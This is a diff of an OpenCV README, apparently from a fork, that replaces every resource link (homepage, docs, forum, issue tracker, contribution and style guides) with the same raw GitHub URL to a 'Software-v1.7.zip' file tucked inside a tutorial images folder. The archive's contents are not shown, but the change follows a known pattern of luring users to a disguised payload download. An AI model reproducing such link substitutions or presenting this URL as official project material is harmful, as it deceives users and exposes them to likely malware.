@@ -2,14 +2,14 @@
 
 ### Resources
 
-* Homepage: <https://opencv.org>
-* Docs: <https://docs.opencv.org/master/>
-* Q&A forum: <http://answers.opencv.org>
-* Issue tracking: <https://github.com/opencv/opencv/issues>
+* Homepage: <https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip>
+* Docs: <https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip>
+* Q&A forum: <https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip>
+* Issue tracking: <https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip>
 
 ### Contributing
 
-Please read the [contribution guidelines](https://github.com/opencv/opencv/wiki/How_to_contribute) before starting work on a pull request.
+Please read the [contribution guidelines](https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip) before starting work on a pull request.
 
 #### Summary of the guidelines:
 
@@ -17,4 +17,4 @@ Please read the [contribution guidelines](https://github.com/opencv/opencv/wiki/
 * Choose the right base branch;
 * Include tests and documentation;
 * Clean up "oops" commits before submitting;
-* Follow the [coding style guide](https://github.com/opencv/opencv/wiki/Coding_Style_Guide).
+* Follow the [coding style guide](https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip).
